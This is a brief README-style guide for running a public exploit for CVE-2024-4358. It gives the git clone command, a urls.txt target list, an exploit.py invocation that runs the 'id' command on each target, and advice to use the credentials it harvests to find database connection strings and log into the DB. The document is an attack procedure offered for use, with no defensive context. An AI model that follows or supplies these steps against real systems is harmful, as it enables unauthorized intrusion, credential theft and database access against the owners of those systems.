![Alt text](POC1.png)

- git clone https://github.com/verylazytech/CVE-2024-4358

Next chose your target and add it to urls.txt file in this format:

- https://ip_address

Run the Exploit:

- python3 exploit.py -l urls.txt  -c id -t 10

And results.txt file will save in the folder. now all what you have to do is to connect to with the credentials and look for interesting connection strings to login the DB.
